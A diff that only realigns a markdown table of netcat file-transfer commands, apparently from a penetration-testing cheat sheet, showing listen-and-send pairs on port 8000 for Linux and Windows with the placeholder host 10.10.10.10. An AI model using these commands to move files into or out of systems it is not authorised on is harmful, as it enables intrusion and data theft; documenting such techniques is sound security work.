@@ -48,9 +48,9 @@
 
 ## Netcat
 
-|Operation|Command|Platform|
-|---|---|---|
-|Receive|`nc -lvnp 8000 > /tmp/file.bin`|Linux|
-|Send|`nc 10.10.10.10 8000 < /tmp/file.bin`|Linux|
-|Receive|`nc.exe -lvnp 8000 > C:\Temp\file.bin`|Windows|
-|Send|`nc.exe 10.10.10.10 8000 < C:\Temp\file.bin`|Windows|
+| Operation | Command                                      | Platform |
+| --------- | -------------------------------------------- | -------- |
+| Receive   | `nc -lvnp 8000 > /tmp/file.bin`              | Linux    |
+| Send      | `nc 10.10.10.10 8000 < /tmp/file.bin`        | Linux    |
+| Receive   | `nc.exe -lvnp 8000 > C:\Temp\file.bin`       | Windows  |
+| Send      | `nc.exe 10.10.10.10 8000 < C:\Temp\file.bin` | Windows  |
